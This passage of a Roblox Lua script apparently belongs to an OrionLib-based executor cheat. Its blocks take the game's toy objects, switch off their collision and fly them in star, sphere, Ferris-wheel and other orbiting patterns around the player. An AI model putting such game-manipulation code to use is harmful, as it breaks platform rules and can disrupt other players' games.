                part.Size = Vector3.new(4, 1, 4); part.Parent = workspace
                local starIndex = (i - 1) % 10
                SH.starPoints[i] = { starIndex = starIndex, isOuter = starIndex % 2 == 0, part = part, assignedToy = nil }
            end
            SH.starAssignedToys = {}
            for i = 1, math.min(#SH.starToys, #SH.starPoints) do
                local toy = SH.starToys[i]
                if toy and toy:IsA("Model") and toy.Name == SH.ObjectIDConfig.CurrentObjectID then
                    local primaryPart = getPrimaryPart(toy)
                    if primaryPart then
                        for _, child in ipairs(toy:GetChildren()) do if child:IsA("BasePart") then child.CanCollide = false; child.CanTouch = false; child.Anchored = false end end
                        local BG, BP = attachPhysics(primaryPart)
                        local toyTable = { BG = BG, BP = BP, Pallet = primaryPart, Model = toy, PointIndex = i, starIndex = SH.starPoints[i].starIndex, isOuter = SH.starPoints[i].isOuter }
                        SH.starPoints[i].assignedToy = toyTable
                        table.insert(SH.starAssignedToys, toyTable)
                    end
                end
            end
            SH.starTime = 0
            if SH.starLoopConn then SH.starLoopConn:Disconnect() end
            SH.starLoopConn = RunService.RenderStepped:Connect(function(dt)
                if not SH.StarConfig.Enabled or not LocalPlayer.Character then return end
                local torso = LocalPlayer.Character:FindFirstChild("Torso") or LocalPlayer.Character:FindFirstChild("UpperTorso")
                if not torso then return end
                SH.starTime = SH.starTime + dt
                local basePosition = SH.StarConfig.FollowPlayer and torso.Position or torso.Position
                for _, point in ipairs(SH.starPoints) do
                    if point.assignedToy and point.assignedToy.BP and point.assignedToy.BG then
                        local toy = point.assignedToy
                        local anglePerPoint = 2 * math.pi / 5
                        local pointAngle = toy.starIndex * (anglePerPoint / 2)
                        local radius = (toy.isOuter and SH.StarConfig.OuterRadius or SH.StarConfig.InnerRadius) * (1 + math.sin(SH.starTime * SH.StarConfig.TwinkleSpeed + toy.starIndex) * 0.2)
                        local x = math.cos(pointAngle + SH.starTime * SH.StarConfig.RotationSpeed) * radius
                        local z = math.sin(pointAngle + SH.starTime * SH.StarConfig.RotationSpeed) * radius
                        local targetPosition = basePosition + Vector3.new(x, SH.StarConfig.Height + math.sin(pointAngle * 3) * 0.5, z)
                        if point.part then point.part.Position = targetPosition end
                        toy.BP.Position = targetPosition
                        local direction = (targetPosition - basePosition).Unit
                        if direction.Magnitude > 0 then toy.BG.CFrame = CFrame.lookAt(targetPosition, targetPosition + direction) end
                    end
                end
            end)
            OrionLib:MakeNotification({ Name = "Star Start", Content = "Outer radius: " .. SH.StarConfig.OuterRadius, Time = 3 })
        else
            if SH.starLoopConn then SH.starLoopConn:Disconnect(); SH.starLoopConn = nil end
            for _, point in ipairs(SH.starPoints) do
                if point.part then point.part:Destroy() end
                if point.assignedToy then
                    if point.assignedToy.BG then point.assignedToy.BG:Destroy() end
                    if point.assignedToy.BP then point.assignedToy.BP:Destroy() end
                end
            end
            SH.starPoints = {}; SH.starAssignedToys = {}
            OrionLib:MakeNotification({ Name = "Star Stop", Content = "Star arrangement cleared", Time = 2 })
        end
    end
    _G.toggleStar = toggleStar
end

-- ============================================================================
-- Block 18: Star2 Feature
-- ============================================================================
do
    local SH = _G.SH
    local LocalPlayer = _G.LocalPlayer
    local RunService = _G.RunService
    local OrionLib = _G.OrionLib
    local findObjects = _G.findObjects
    local getPrimaryPart = _G.getPrimaryPart
    local attachPhysics = _G.attachPhysics

    function toggleStar2(state)
        SH.Star2Config.Enabled = state
        if state then
            PlayActionSound()
            if SH.FeatherConfig.Enabled then _G.toggleFeather(false) end
            if SH.MagicCircleConfig.Enabled then _G.toggleMagicCircle(false) end
            if SH.HeartConfig.Enabled then _G.toggleHeart(false) end
            if SH.BigHeartConfig.Enabled then _G.toggleBigHeart(false) end
            if SH.StarOfDavidConfig.Enabled then _G.toggleStarOfDavid(false) end
            if SH.StarConfig.Enabled then _G.toggleStar(false) end
            if SH.SphereConfig.Enabled then _G.toggleSphere(false) end
            if SH.FerrisWheelConfig.Enabled then _G.toggleFerrisWheel(false) end
            if SH.AnimN1Config.Enabled then _G.toggleAnimN1(false) end
            if SH.AnimN2Config.Enabled then _G.toggleAnimN2(false) end
            if SH.AnimN3Config.Enabled then _G.toggleAnimN3(false) end
            if SH.WingConfig.Enabled then _G.toggleWing(false) end
            if SH.SaturnConfig.Enabled then _G.toggleSaturn(false) end
            if SH.PianoConfig.Enabled then _G.togglePiano(false) end
            if SH.VerticalHeartConfig.Enabled then _G.toggleVerticalHeart(false) end
            if SH.VerticalBigHeartConfig.Enabled then _G.toggleVerticalBigHeart(false) end
            if SH.SuperRingConfig.Enabled then _G.toggleSuperRing(false) end
            SH.star2Toys = findObjects()
            if #SH.star2Toys == 0 then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "No objects found", Time = 3 })
                SH.Star2Config.Enabled = false
                return
            end
            local count = math.min(#SH.star2Toys, SH.Star2Config.ObjectCount)
            SH.star2Points = {}
            for i = 1, count do
                local part = Instance.new("Part")
                part.CanCollide = false; part.Anchored = true; part.Transparency = 1
                part.Size = Vector3.new(4, 1, 4); part.Parent = workspace
                SH.star2Points[i] = { angle = (i - 1) * (2 * math.pi / count), part = part, assignedToy = nil, rayIndex = (i - 1) % SH.Star2Config.RayCount }
            end
            SH.star2AssignedToys = {}
            for i = 1, math.min(#SH.star2Toys, #SH.star2Points) do
                local toy = SH.star2Toys[i]
                if toy and toy:IsA("Model") and toy.Name == SH.ObjectIDConfig.CurrentObjectID then
                    local primaryPart = getPrimaryPart(toy)
                    if primaryPart then
                        for _, child in ipairs(toy:GetChildren()) do if child:IsA("BasePart") then child.CanCollide = false; child.CanTouch = false; child.Anchored = false end end
                        local BG, BP = attachPhysics(primaryPart, 20000, 300)
                        local toyTable = { BG = BG, BP = BP, Pallet = primaryPart, Model = toy, PointIndex = i, baseAngle = SH.star2Points[i].angle, rayIndex = SH.star2Points[i].rayIndex }
                        SH.star2Points[i].assignedToy = toyTable
                        table.insert(SH.star2AssignedToys, toyTable)
                    end
                end
            end
            SH.star2Time = 0
            if SH.star2LoopConn then SH.star2LoopConn:Disconnect() end
            SH.star2LoopConn = RunService.RenderStepped:Connect(function(dt)
                if not SH.Star2Config.Enabled or not LocalPlayer.Character then return end
                local torso = LocalPlayer.Character:FindFirstChild("Torso") or LocalPlayer.Character:FindFirstChild("UpperTorso")
                if not torso then return end
                SH.star2Time = SH.star2Time + dt
                local basePosition = SH.Star2Config.FollowPlayer and torso.Position or torso.Position
                local pulseEffect = (SH.Star2Config.PulseSpeed > 0) and math.sin(SH.star2Time * SH.Star2Config.PulseSpeed) * SH.Star2Config.PulseAmplitude or 0
                for _, point in ipairs(SH.star2Points) do
                    if point.assignedToy and point.assignedToy.BP and point.assignedToy.BG then
                        local toy = point.assignedToy
                        local currentAngle = toy.baseAngle + (SH.star2Time * SH.Star2Config.RotationSpeed)
                        local scale = SH.Star2Config.Size / 10
                        local baseRadius = scale
                        local rayFactor = 0
                        local anglePerRay = 2 * math.pi / SH.Star2Config.RayCount
                        local rayAngle = toy.rayIndex * anglePerRay
                        local angleDiff = math.abs(currentAngle - rayAngle)
                        if angleDiff > math.pi then angleDiff = 2 * math.pi - angleDiff end
                        if angleDiff < (anglePerRay / 4) then
                            rayFactor = (1 - (angleDiff / (anglePerRay / 4))) * SH.Star2Config.RayLength * (1 + math.sin(SH.star2Time * SH.Star2Config.JitterSpeed + toy.rayIndex) * SH.Star2Config.JitterAmount * 0.1)
                        end
                        local finalRadius = (baseRadius + rayFactor) * (1 + (pulseEffect * 0.1))
                        local x = math.cos(currentAngle) * math.min(finalRadius, SH.Star2Config.MaxDistance)
                        local z = math.sin(currentAngle) * math.min(finalRadius, SH.Star2Config.MaxDistance)
                        local targetPosition = basePosition + Vector3.new(x, SH.Star2Config.Height + math.sin(SH.star2Time * 3 + toy.rayIndex) * 0.5, z)
                        if point.part then point.part.Position = targetPosition end
                        toy.BP.Position = targetPosition
                        local direction = (targetPosition - basePosition).Unit
                        if direction.Magnitude > 0 then toy.BG.CFrame = toy.BG.CFrame:Lerp(CFrame.lookAt(targetPosition, targetPosition + direction), 0.5) end
                    end
                end
            end)
            OrionLib:MakeNotification({ Name = "Star2 Start", Content = "Size: " .. SH.Star2Config.Size, Time = 3 })
        else
            if SH.star2LoopConn then SH.star2LoopConn:Disconnect(); SH.star2LoopConn = nil end
            for _, point in ipairs(SH.star2Points) do
                if point.part then point.part:Destroy() end
                if point.assignedToy then
                    if point.assignedToy.BG then point.assignedToy.BG:Destroy() end
                    if point.assignedToy.BP then point.assignedToy.BP:Destroy() end
                end
            end
            SH.star2Points = {}; SH.star2AssignedToys = {}
            OrionLib:MakeNotification({ Name = "Star2 Stop", Content = "Star2 cleared", Time = 2 })
        end
    end
    _G.toggleStar2 = toggleStar2
end

-- ============================================================================
-- Block 19: Sphere Feature
-- ============================================================================
do
    local SH = _G.SH
    local LocalPlayer = _G.LocalPlayer
    local RunService = _G.RunService
    local OrionLib = _G.OrionLib
    local findObjects = _G.findObjects
    local getPrimaryPart = _G.getPrimaryPart
    local attachPhysics = _G.attachPhysics

    function toggleSphere(state)
        SH.SphereConfig.Enabled = state
        if state then
            PlayActionSound()
            if SH.FeatherConfig.Enabled then _G.toggleFeather(false) end
            if SH.MagicCircleConfig.Enabled then _G.toggleMagicCircle(false) end
            if SH.HeartConfig.Enabled then _G.toggleHeart(false) end
            if SH.BigHeartConfig.Enabled then _G.toggleBigHeart(false) end
            if SH.StarOfDavidConfig.Enabled then _G.toggleStarOfDavid(false) end
            if SH.StarConfig.Enabled then _G.toggleStar(false) end
            if SH.Star2Config.Enabled then _G.toggleStar2(false) end
            if SH.FerrisWheelConfig.Enabled then _G.toggleFerrisWheel(false) end
            if SH.AnimN1Config.Enabled then _G.toggleAnimN1(false) end
            if SH.AnimN2Config.Enabled then _G.toggleAnimN2(false) end
            if SH.AnimN3Config.Enabled then _G.toggleAnimN3(false) end
            if SH.WingConfig.Enabled then _G.toggleWing(false) end
            if SH.SaturnConfig.Enabled then _G.toggleSaturn(false) end
            if SH.PianoConfig.Enabled then _G.togglePiano(false) end
            if SH.VerticalHeartConfig.Enabled then _G.toggleVerticalHeart(false) end
            if SH.VerticalBigHeartConfig.Enabled then _G.toggleVerticalBigHeart(false) end
            if SH.SuperRingConfig.Enabled then _G.toggleSuperRing(false) end
            SH.sphereToys = findObjects()
            if #SH.sphereToys == 0 then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "No objects found", Time = 3 })
                SH.SphereConfig.Enabled = false
                return
            end
            local count = math.min(#SH.sphereToys, SH.SphereConfig.ObjectCount)
            SH.spherePoints = {}
            for i = 1, count do
                local part = Instance.new("Part")
                part.CanCollide = false; part.Anchored = true; part.Transparency = 1
                part.Size = Vector3.new(4, 1, 4); part.Parent = workspace
                local latIndex = math.floor((i - 1) / SH.SphereConfig.Longitudes) + 1
                local lonIndex = ((i - 1) % SH.SphereConfig.Longitudes) + 1
                SH.spherePoints[i] = { latitudeIndex = latIndex, longitudeIndex = lonIndex, part = part, assignedToy = nil }
            end
            SH.sphereAssignedToys = {}
            for i = 1, math.min(#SH.sphereToys, #SH.spherePoints) do
                local toy = SH.sphereToys[i]
                if toy and toy:IsA("Model") and toy.Name == SH.ObjectIDConfig.CurrentObjectID then
                    local primaryPart = getPrimaryPart(toy)
                    if primaryPart then
                        for _, child in ipairs(toy:GetChildren()) do if child:IsA("BasePart") then child.CanCollide = false; child.CanTouch = false; child.Anchored = false end end
                        local BG, BP = attachPhysics(primaryPart, 20000, 300)
                        local toyTable = { BG = BG, BP = BP, Pallet = primaryPart, Model = toy, PointIndex = i, latitudeIndex = SH.spherePoints[i].latitudeIndex, longitudeIndex = SH.spherePoints[i].longitudeIndex }
                        SH.spherePoints[i].assignedToy = toyTable
                        table.insert(SH.sphereAssignedToys, toyTable)
                    end
                end
            end
            SH.sphereTime = 0
            if SH.sphereLoopConn then SH.sphereLoopConn:Disconnect() end
            SH.sphereLoopConn = RunService.RenderStepped:Connect(function(dt)
                if not SH.SphereConfig.Enabled or not LocalPlayer.Character then return end
                local torso = LocalPlayer.Character:FindFirstChild("Torso") or LocalPlayer.Character:FindFirstChild("UpperTorso")
                if not torso then return end
                SH.sphereTime = SH.sphereTime + dt
                local basePosition = SH.SphereConfig.FollowPlayer and torso.Position or torso.Position
                for _, point in ipairs(SH.spherePoints) do
                    if point.assignedToy and point.assignedToy.BP and point.assignedToy.BG then
                        local toy = point.assignedToy
                        local latAngle = ((toy.latitudeIndex - 1) / (SH.SphereConfig.Latitudes - 1) - 0.5) * math.pi
                        local lonAngle = ((toy.longitudeIndex - 1) / SH.SphereConfig.Longitudes) * 2 * math.pi
                        local rotatedLon = lonAngle + (SH.sphereTime * SH.SphereConfig.HorizontalRotationSpeed)
                        local rotatedLat = latAngle + (SH.sphereTime * SH.SphereConfig.VerticalRotationSpeed * 0.5)
                        local pulse = (SH.SphereConfig.PulseSpeed > 0) and 1 + math.sin(SH.sphereTime * SH.SphereConfig.PulseSpeed) * SH.SphereConfig.PulseAmplitude or 1
                        local finalRadius = SH.SphereConfig.Radius * pulse
                        local x = finalRadius * math.cos(rotatedLat) * math.cos(rotatedLon)
                        local y = finalRadius * math.sin(rotatedLat)
                        local z = finalRadius * math.cos(rotatedLat) * math.sin(rotatedLon)
                        local targetPosition = basePosition + Vector3.new(x, SH.SphereConfig.BaseHeight + y, z)
                        if point.part then point.part.Position = targetPosition end
                        toy.BP.Position = targetPosition
                        local direction = (targetPosition - basePosition).Unit
                        if direction.Magnitude > 0 then toy.BG.CFrame = toy.BG.CFrame:Lerp(CFrame.lookAt(targetPosition, targetPosition + direction), 0.4) end
                    end
                end
            end)
            OrionLib:MakeNotification({ Name = "Sphere Start", Content = "Radius: " .. SH.SphereConfig.Radius, Time = 3 })
        else
            if SH.sphereLoopConn then SH.sphereLoopConn:Disconnect(); SH.sphereLoopConn = nil end
            for _, point in ipairs(SH.spherePoints) do
                if point.part then point.part:Destroy() end
                if point.assignedToy then
                    if point.assignedToy.BG then point.assignedToy.BG:Destroy() end
                    if point.assignedToy.BP then point.assignedToy.BP:Destroy() end
                end
            end
            SH.spherePoints = {}; SH.sphereAssignedToys = {}
            OrionLib:MakeNotification({ Name = "Sphere Stop", Content = "Sphere cleared", Time = 2 })
        end
    end
    _G.toggleSphere = toggleSphere
end

-- ============================================================================
-- Block 20: Ferris Wheel Feature
-- ============================================================================
do
    local SH = _G.SH
    local LocalPlayer = _G.LocalPlayer
    local RunService = _G.RunService
    local OrionLib = _G.OrionLib
    local findObjects = _G.findObjects
    local getPrimaryPart = _G.getPrimaryPart
    local attachPhysics = _G.attachPhysics

    function toggleFerrisWheel(state)
        SH.FerrisWheelConfig.Enabled = state
        if state then
            PlayActionSound()
            if SH.FeatherConfig.Enabled then _G.toggleFeather(false) end
            if SH.MagicCircleConfig.Enabled then _G.toggleMagicCircle(false) end
            if SH.HeartConfig.Enabled then _G.toggleHeart(false) end
            if SH.BigHeartConfig.Enabled then _G.toggleBigHeart(false) end
            if SH.StarOfDavidConfig.Enabled then _G.toggleStarOfDavid(false) end
            if SH.StarConfig.Enabled then _G.toggleStar(false) end
            if SH.Star2Config.Enabled then _G.toggleStar2(false) end
            if SH.SphereConfig.Enabled then _G.toggleSphere(false) end
            if SH.AnimN1Config.Enabled then _G.toggleAnimN1(false) end
            if SH.AnimN2Config.Enabled then _G.toggleAnimN2(false) end
            if SH.AnimN3Config.Enabled then _G.toggleAnimN3(false) end
            if SH.WingConfig.Enabled then _G.toggleWing(false) end
            if SH.SaturnConfig.Enabled then _G.toggleSaturn(false) end
            if SH.PianoConfig.Enabled then _G.togglePiano(false) end
            if SH.VerticalHeartConfig.Enabled then _G.toggleVerticalHeart(false) end
            if SH.VerticalBigHeartConfig.Enabled then _G.toggleVerticalBigHeart(false) end
            if SH.SuperRingConfig.Enabled then _G.toggleSuperRing(false) end
            SH.ferrisWheelToys = findObjects()
            if #SH.ferrisWheelToys == 0 then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "No objects found", Time = 3 })
                SH.FerrisWheelConfig.Enabled = false
                return
            end
            local count = math.min(#SH.ferrisWheelToys, SH.FerrisWheelConfig.ObjectCount)
            local angleStep = (2 * math.pi) / count
            SH.ferrisWheelPoints = {}
            for i = 1, count do
                local part = Instance.new("Part")
                part.CanCollide = false; part.Anchored = true; part.Transparency = 1
                part.Size = Vector3.new(4, 1, 4); part.Parent = workspace
                SH.ferrisWheelPoints[i] = { baseAngle = (i - 1) * angleStep, part = part, assignedToy = nil }
            end
            SH.ferrisWheelAssignedToys = {}
            for i = 1, math.min(#SH.ferrisWheelToys, #SH.ferrisWheelPoints) do
                local toy = SH.ferrisWheelToys[i]
                if toy and toy:IsA("Model") and toy.Name == SH.ObjectIDConfig.CurrentObjectID then
                    local primaryPart = getPrimaryPart(toy)
                    if primaryPart then
                        for _, child in ipairs(toy:GetChildren()) do if child:IsA("BasePart") then child.CanCollide = false; child.CanTouch = false; child.Anchored = false end end
                        local BG, BP = attachPhysics(primaryPart, 20000, 300)
                        local toyTable = { BG = BG, BP = BP, Pallet = primaryPart, Model = toy, PointIndex = i, baseAngle = SH.ferrisWheelPoints[i].baseAngle }
                        SH.ferrisWheelPoints[i].assignedToy = toyTable
                        table.insert(SH.ferrisWheelAssignedToys, toyTable)
                    end
                end
            end
            SH.ferrisWheelTime = 0
            if SH.ferrisWheelLoopConn then SH.ferrisWheelLoopConn:Disconnect() end
            SH.ferrisWheelLoopConn = RunService.RenderStepped:Connect(function(dt)
                if not SH.FerrisWheelConfig.Enabled or not LocalPlayer.Character then return end
                local torso = LocalPlayer.Character:FindFirstChild("Torso") or LocalPlayer.Character:FindFirstChild("UpperTorso")
                if not torso then return end
                SH.ferrisWheelTime = SH.ferrisWheelTime + dt
                local basePosition = SH.FerrisWheelConfig.FollowPlayer and torso.Position or torso.Position
                local fixedCFrame = SH.FerrisWheelConfig.FixedDirection and CFrame.Angles(math.rad(SH.FerrisWheelConfig.FixedPitch), math.rad(SH.FerrisWheelConfig.FixedYaw), math.rad(SH.FerrisWheelConfig.FixedRoll)) or nil
                for _, point in ipairs(SH.ferrisWheelPoints) do
                    if point.assignedToy and point.assignedToy.BP and point.assignedToy.BG then
                        local toy = point.assignedToy
                        local currentAngle = (toy.baseAngle + SH.ferrisWheelTime * SH.FerrisWheelConfig.RotationSpeed) % (2 * math.pi)
                        local x, y, z
                        if SH.FerrisWheelConfig.VerticalCircle then
                            x = math.cos(currentAngle) * SH.FerrisWheelConfig.Radius
                            y = math.sin(currentAngle) * SH.FerrisWheelConfig.Radius + SH.FerrisWheelConfig.Height
                            z = 0
                        else
                            x = math.cos(currentAngle) * SH.FerrisWheelConfig.Radius
                            y = SH.FerrisWheelConfig.Height
                            z = math.sin(currentAngle) * SH.FerrisWheelConfig.Radius
                        end
                        local targetPosition = basePosition + Vector3.new(x, y, z)
                        if point.part then point.part.Position = targetPosition end
                        toy.BP.Position = targetPosition
                        if fixedCFrame then
                            toy.BG.CFrame = CFrame.new(targetPosition) * fixedCFrame
                        else
                            toy.BG.CFrame = CFrame.lookAt(targetPosition, basePosition)
                        end
                    end
                end
            end)
            OrionLib:MakeNotification({ Name = "Ferris Wheel Start", Content = "Radius: " .. SH.FerrisWheelConfig.Radius, Time = 3 })
        else
            if SH.ferrisWheelLoopConn then SH.ferrisWheelLoopConn:Disconnect(); SH.ferrisWheelLoopConn = nil end
            for _, point in ipairs(SH.ferrisWheelPoints) do
                if point.part then point.part:Destroy() end
                if point.assignedToy then
                    if point.assignedToy.BG then point.assignedToy.BG:Destroy() end
                    if point.assignedToy.BP then point.assignedToy.BP:Destroy() end
                end
            end
            SH.ferrisWheelPoints = {}; SH.ferrisWheelAssignedToys = {}
            OrionLib:MakeNotification({ Name = "Ferris Wheel Stop", Content = "Ferris wheel cleared", Time = 2 })
        end
    end
    _G.toggleFerrisWheel = toggleFerrisWheel
end

-- ============================================================================
-- Block 21: Animations N1, N2, N3
-- ============================================================================
do
    local SH = _G.SH
    local LocalPlayer = _G.LocalPlayer
    local RunService = _G.RunService
    local OrionLib = _G.OrionLib
    local findObjects = _G.findObjects
    local getPrimaryPart = _G.getPrimaryPart
    local attachPhysics = _G.attachPhysics

    function toggleAnimN1(state)
        SH.AnimN1Config.Enabled = state
        if state then
            PlayActionSound()
            if SH.FeatherConfig.Enabled then _G.toggleFeather(false) end
            if SH.MagicCircleConfig.Enabled then _G.toggleMagicCircle(false) end
            if SH.HeartConfig.Enabled then _G.toggleHeart(false) end
            if SH.BigHeartConfig.Enabled then _G.toggleBigHeart(false) end
            if SH.StarOfDavidConfig.Enabled then _G.toggleStarOfDavid(false) end
            if SH.StarConfig.Enabled then _G.toggleStar(false) end
            if SH.Star2Config.Enabled then _G.toggleStar2(false) end
            if SH.SphereConfig.Enabled then _G.toggleSphere(false) end
            if SH.FerrisWheelConfig.Enabled then _G.toggleFerrisWheel(false) end
            if SH.AnimN2Config.Enabled then _G.toggleAnimN2(false) end
            if SH.AnimN3Config.Enabled then _G.toggleAnimN3(false) end
            if SH.WingConfig.Enabled then _G.toggleWing(false) end
            if SH.SaturnConfig.Enabled then _G.toggleSaturn(false) end
            if SH.PianoConfig.Enabled then _G.togglePiano(false) end
            if SH.VerticalHeartConfig.Enabled then _G.toggleVerticalHeart(false) end
            if SH.VerticalBigHeartConfig.Enabled then _G.toggleVerticalBigHeart(false) end
            if SH.SuperRingConfig.Enabled then _G.toggleSuperRing(false) end
            SH.animN1Toys = findObjects()
            if #SH.animN1Toys == 0 then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "No objects found", Time = 3 })
                SH.AnimN1Config.Enabled = false
                return
            end
            local count = math.min(#SH.animN1Toys, SH.AnimN1Config.ObjectCount)
            SH.animN1Points = {}
            for i = 1, count do
                local part = Instance.new("Part")
                part.CanCollide = false; part.Anchored = true; part.Transparency = 1
                part.Size = Vector3.new(4, 1, 4); part.Parent = workspace
                SH.animN1Points[i] = { baseAngle = (i - 1) * (2 * math.pi / count), part = part, assignedToy = nil }
            end
            SH.animN1AssignedToys = {}
            for i = 1, math.min(#SH.animN1Toys, #SH.animN1Points) do
                local toy = SH.animN1Toys[i]
                if toy and toy:IsA("Model") and toy.Name == SH.ObjectIDConfig.CurrentObjectID then
                    local primaryPart = getPrimaryPart(toy)
                    if primaryPart then
                        for _, child in ipairs(toy:GetChildren()) do if child:IsA("BasePart") then child.CanCollide = false; child.CanTouch = false; child.Anchored = false; child.Material = Enum.Material.Neon end end
                        local BG, BP = attachPhysics(primaryPart, 30000, 500)
                        local toyTable = { BG = BG, BP = BP, Pallet = primaryPart, Model = toy, PointIndex = i, baseAngle = SH.animN1Points[i].baseAngle }
                        SH.animN1Points[i].assignedToy = toyTable
                        table.insert(SH.animN1AssignedToys, toyTable)
                    end
                end
            end
            SH.animN1Time = 0
            if SH.animN1LoopConn then SH.animN1LoopConn:Disconnect() end
            SH.animN1LoopConn = RunService.RenderStepped:Connect(function(dt)
                if not SH.AnimN1Config.Enabled or not LocalPlayer.Character then return end
                local torso = LocalPlayer.Character:FindFirstChild("Torso") or LocalPlayer.Character:FindFirstChild("UpperTorso")
                if not torso then return end
                SH.animN1Time = SH.animN1Time + dt
                local basePosition = SH.AnimN1Config.FollowPlayer and torso.Position or torso.Position
                for i, point in ipairs(SH.animN1Points) do
                    if point.assignedToy and point.assignedToy.BP and point.assignedToy.BG then
                        local toy = point.assignedToy
                        local rotationAngle = toy.baseAngle + (SH.animN1Time * SH.AnimN1Config.RotationSpeed)
                        local pulse = math.sin(SH.animN1Time * SH.AnimN1Config.PulseSpeed) * SH.AnimN1Config.PulseAmount
                        local currentRadius = SH.AnimN1Config.Radius + pulse
                        local currentHeight = SH.AnimN1Config.Height + math.sin(SH.animN1Time * 3 + i) * 5
                        local chaosX = math.sin(SH.animN1Time * 2 + i) * 2
                        local chaosY = math.cos(SH.animN1Time * 2.5 + i) * 2
                        local chaosZ = math.sin(SH.animN1Time * 3 + i) * 2
                        local x = math.cos(rotationAngle) * currentRadius + chaosX
                        local z = math.sin(rotationAngle) * currentRadius + chaosZ
                        local y = currentHeight + chaosY
                        local targetPosition = basePosition + Vector3.new(x, y, z)
                        if point.part then point.part.Position = targetPosition end
                        toy.BP.Position = targetPosition
                        toy.BG.CFrame = CFrame.new(targetPosition)
                    end
                end
            end)
            OrionLib:MakeNotification({ Name = "N1 Start", Content = "Object count: " .. #SH.animN1AssignedToys, Time = 3 })
        else
            if SH.animN1LoopConn then SH.animN1LoopConn:Disconnect(); SH.animN1LoopConn = nil end
            for _, point in ipairs(SH.animN1Points) do
                if point.part then point.part:Destroy() end
                if point.assignedToy then
                    if point.assignedToy.BG then point.assignedToy.BG:Destroy() end
                    if point.assignedToy.BP then point.assignedToy.BP:Destroy() end
                    for _, child in ipairs(point.assignedToy.Model:GetDescendants()) do if child:IsA("BasePart") then child.Material = Enum.Material.Plastic end end
                end
            end
            SH.animN1Points = {}; SH.animN1AssignedToys = {}
            OrionLib:MakeNotification({ Name = "N1 Stop", Content = "Animation cleared", Time = 2 })
        end
    end
    _G.toggleAnimN1 = toggleAnimN1

    function toggleAnimN2(state)
        SH.AnimN2Config.Enabled = state
        if state then
            PlayActionSound()
            if SH.FeatherConfig.Enabled then _G.toggleFeather(false) end
            if SH.MagicCircleConfig.Enabled then _G.toggleMagicCircle(false) end
            if SH.HeartConfig.Enabled then _G.toggleHeart(false) end
            if SH.BigHeartConfig.Enabled then _G.toggleBigHeart(false) end
            if SH.StarOfDavidConfig.Enabled then _G.toggleStarOfDavid(false) end
            if SH.StarConfig.Enabled then _G.toggleStar(false) end
            if SH.Star2Config.Enabled then _G.toggleStar2(false) end
            if SH.SphereConfig.Enabled then _G.toggleSphere(false) end
            if SH.FerrisWheelConfig.Enabled then _G.toggleFerrisWheel(false) end
            if SH.AnimN1Config.Enabled then _G.toggleAnimN1(false) end
            if SH.AnimN3Config.Enabled then _G.toggleAnimN3(false) end
            if SH.WingConfig.Enabled then _G.toggleWing(false) end
            if SH.SaturnConfig.Enabled then _G.toggleSaturn(false) end
            if SH.PianoConfig.Enabled then _G.togglePiano(false) end
            if SH.VerticalHeartConfig.Enabled then _G.toggleVerticalHeart(false) end
            if SH.VerticalBigHeartConfig.Enabled then _G.toggleVerticalBigHeart(false) end
            if SH.SuperRingConfig.Enabled then _G.toggleSuperRing(false) end
            SH.animN2Toys = findObjects()
            if #SH.animN2Toys == 0 then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "No objects found", Time = 3 })
                SH.AnimN2Config.Enabled = false
                return
            end
            local count = math.min(#SH.animN2Toys, SH.AnimN2Config.ObjectCount)
            SH.animN2Points = {}
            for i = 1, count do
                local part = Instance.new("Part")
                part.CanCollide = false; part.Anchored = true; part.Transparency = 1
                part.Size = Vector3.new(4, 1, 4); part.Parent = workspace
                SH.animN2Points[i] = { baseAngle = (i - 1) * (2 * math.pi / count), part = part, assignedToy = nil }
            end
            SH.animN2AssignedToys = {}
            for i = 1, math.min(#SH.animN2Toys, #SH.animN2Points) do
                local toy = SH.animN2Toys[i]
                if toy and toy:IsA("Model") and toy.Name == SH.ObjectIDConfig.CurrentObjectID then
                    local primaryPart = getPrimaryPart(toy)
                    if primaryPart then
                        for _, child in ipairs(toy:GetChildren()) do if child:IsA("BasePart") then child.CanCollide = false; child.CanTouch = false; child.Anchored = false; child.Material = Enum.Material.Neon end end
                        local BG, BP = attachPhysics(primaryPart, 25000, 400)
                        local toyTable = { BG = BG, BP = BP, Pallet = primaryPart, Model = toy, PointIndex = i, baseAngle = SH.animN2Points[i].baseAngle }
                        SH.animN2Points[i].assignedToy = toyTable
                        table.insert(SH.animN2AssignedToys, toyTable)
                    end
                end
            end
            SH.animN2Time = 0
            if SH.animN2LoopConn then SH.animN2LoopConn:Disconnect() end
            SH.animN2LoopConn = RunService.RenderStepped:Connect(function(dt)
                if not SH.AnimN2Config.Enabled or not LocalPlayer.Character then return end
                local torso = LocalPlayer.Character:FindFirstChild("Torso") or LocalPlayer.Character:FindFirstChild("UpperTorso")
                if not torso then return end
                SH.animN2Time = SH.animN2Time + dt
                local basePosition = SH.AnimN2Config.FollowPlayer and torso.Position or torso.Position
                for i, point in ipairs(SH.animN2Points) do
                    if point.assignedToy and point.assignedToy.BP and point.assignedToy.BG then
                        local toy = point.assignedToy
                        local rotationAngle = toy.baseAngle + (SH.animN2Time * SH.AnimN2Config.RotationSpeed)
                        local rise = (SH.animN2Time * SH.AnimN2Config.RiseSpeed) % (SH.AnimN2Config.TopHeight - SH.AnimN2Config.BaseHeight)
                        local currentHeight = SH.AnimN2Config.BaseHeight + rise
                        local chaos = math.sin(SH.animN2Time * SH.AnimN2Config.ChaosFactor + i) * 2
                        local currentRadius = SH.AnimN2Config.Radius + chaos
                        local x = math.cos(rotationAngle) * currentRadius + math.sin(SH.animN2Time * 5 + i) * 1.5
                        local z = math.sin(rotationAngle) * currentRadius + math.cos(SH.animN2Time * 5 + i) * 1.5
                        local targetPosition = basePosition + Vector3.new(x, currentHeight, z)
                        if point.part then point.part.Position = targetPosition end
                        toy.BP.Position = targetPosition
                        toy.BG.CFrame = CFrame.new(targetPosition)
                    end
                end
            end)
            OrionLib:MakeNotification({ Name = "N2 Start", Content = "Object count: " .. #SH.animN2AssignedToys, Time = 3 })
        else
            if SH.animN2LoopConn then SH.animN2LoopConn:Disconnect(); SH.animN2LoopConn = nil end
            for _, point in ipairs(SH.animN2Points) do
                if point.part then point.part:Destroy() end
                if point.assignedToy then
                    if point.assignedToy.BG then point.assignedToy.BG:Destroy() end
                    if point.assignedToy.BP then point.assignedToy.BP:Destroy() end
